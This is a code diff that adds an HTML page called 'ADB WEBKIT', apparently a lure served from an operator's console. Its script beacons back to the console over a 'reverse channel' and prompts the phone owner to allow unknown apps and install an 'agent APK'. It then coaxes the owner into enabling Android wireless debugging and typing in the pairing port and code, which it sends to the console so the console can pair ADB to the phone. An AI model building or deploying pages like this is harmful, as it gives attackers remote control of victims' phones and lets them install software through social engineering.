@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ADB WEBKIT</title>
+<style>
+  :root{--g:#16c60c;--r:#dc143c}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#0d1117;color:#e6edf3;font:15px/1.5 system-ui,Segoe UI,Roboto,sans-serif}
+  .card{width:min(92vw,420px);background:#161b22;border:1px solid #30363d;border-radius:16px;
+        padding:28px 24px;box-shadow:0 12px 40px #0008}
+  h1{margin:0 0 4px;font-size:22px;letter-spacing:.5px}
+  h1 b{color:var(--g)} h1 i{color:var(--r);font-style:normal}
+  .cap{color:#8b949e;margin:0 0 18px;font-size:13px}
+  .row{display:flex;gap:10px}
+  input{flex:1;background:#0d1117;border:1px solid #30363d;color:#e6edf3;border-radius:10px;
+        padding:11px 12px;font-size:16px}
+  button{background:var(--g);color:#04120a;border:0;border-radius:10px;padding:11px 16px;
+         font-weight:700;font-size:15px}
+  button.alt{background:#30363d;color:#e6edf3}
+  .step{margin-top:18px;padding-top:16px;border-top:1px solid #21262d}
+  .step h2{font-size:12px;text-transform:uppercase;letter-spacing:1.2px;color:#8b949e;margin:0 0 8px}
+  ol{margin:0;padding-left:20px;color:#adbac7;font-size:13px}
+  .status{margin-top:18px;font-size:13px;color:#8b949e}
+  .dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:#f0883e;margin-right:7px;
+       vertical-align:middle}
+  .dot.on{background:var(--g);box-shadow:0 0 8px var(--g)}
+  pre{margin:10px 0 0;background:#0d1117;border:1px solid #21262d;border-radius:10px;padding:10px;
+      font-size:12px;overflow:auto;color:#adbac7}
+  .hide{display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>ADB <b>WEBKIT</b></h1>
+  <p class="cap" id="cap">connecting&hellip;</p>
+
+  <div class="step hide" id="p0">
+    <h2>0 &middot; install the agent</h2>
+    <p class="status" style="margin:0 0 10px">Turn on <b>Install unknown apps</b>, then:</p>
+    <a id="apk" href="#"><button style="width:100%">Install agent APK</button></a>
+    <p class="status" style="margin:10px 0 0;font-size:12px" id="apknote"></p>
+  </div>
+
+  <div class="step" id="p1">
+    <h2>1 &middot; zero-touch</h2>
+    <p class="status" style="margin:0"><span class="dot" id="d1"></span>handshaking with the console</p>
+  </div>
+
+  <div class="step hide" id="p2">
+    <h2>2 &middot; tap to pair (optional upgrade)</h2>
+    <ol>
+      <li>Settings &rarr; Developer options &rarr; Wireless debugging &rarr; <b>On</b></li>
+      <li>Tap <b>Pair device with pairing code</b></li>
+      <li>Type the two numbers here:</li>
+    </ol>
+    <div class="row" style="margin-top:10px">
+      <input id="wport" inputmode="numeric" placeholder="port">
+      <input id="wcode" inputmode="numeric" placeholder="code">
+      <button id="pair">Pair</button>
+    </div>
+    <pre id="pairout" class="hide"></pre>
+  </div>
+
+  <div class="status"><span class="dot" id="d2"></span><span id="st">waiting for the console</span></div>
+  <pre id="log" class="hide"></pre>
+</div>
+
+<script>
+const SID = {"sid"};                       // replaced by the console at arm time
+const base = location.origin + "/s/" + SID;
+let got = false;
+
+function log(t){const l=document.getElementById("log");l.classList.remove("hide");l.textContent+=t+"\n";}
+
+// 1. Beacon. If this line reaches the console, a reverse channel exists and the
+//    agent/ADB path is available. CORS is allowed, so it is a plain fetch.
+async function enroll(){
+  try{
+    const r = await fetch(base + "/enroll", {cache:"no-store"});
+    const j = await r.json();
+    got = true;
+    document.getElementById("d1").classList.add("on");
+    document.querySelector("#p1 .status").innerHTML =
+      '<span class="dot on"></span>console reached &middot; device ' + j.device;
+    document.getElementById("p2").classList.remove("hide");
+    document.getElementById("st").textContent = "console reached";
+    poll();
+  }catch(e){ log("enroll: " + e); }
+}
+async function poll(){
+  try{
+    const r = await fetch(base + "/state", {cache:"no-store"});
+    const j = await r.json();
+    const s = j.state || {};
+    const label = {connected:"ADB connected", waiting:"channel up, ADB pending",
+                   unpaired:"channel up, tap-pair for ADB",} [s.adb] || s.adb || "new";
+    document.getElementById("st").textContent = label;
+    if (s.adb === "connected") document.getElementById("d2").classList.add("on");
+    if (j.has_apk) {
+      const p0 = document.getElementById("p0");
+      p0.classList.remove("hide");
+      const a = document.getElementById("apk");
+      a.href = base + "/apk";
+      document.getElementById("apknote").textContent =
+        j.apk_name ? ("package: " + j.apk_name + " \u2014 opens Android's installer") : "";
+    }
+  }catch(e){}
+  setTimeout(poll, 3000);
+}
+
+// 2. Pair wire. Values are typed by the human; the console pairs from the
+//    caller's own source address, never from anything we send.
+document.getElementById("pair").onclick = async () => {
+  const port = document.getElementById("wport").value.trim();
+  const code = document.getElementById("wcode").value.trim();
+  if(!port || !code) return;
+  const out = document.getElementById("pairout"); out.classList.remove("hide");
+  out.textContent = "pairing " + port + " \u2026";
+  try{
+    const r = await fetch(base + "/pair", {method:"POST",
+      headers:{"Content-Type":"application/json"}, body: JSON.stringify({port, code})});
+    const j = await r.json();
+    out.textContent = JSON.stringify(j, null, 1);
+  }catch(e){ out.textContent = "error: " + e; }
+};
+
+// Try beacon now, and again on resume (the phone may have been asleep).
+enroll();
+document.addEventListener("visibilitychange", () => { if(!document.hidden && !got) enroll(); });
+</script>
+</body>
+</html>
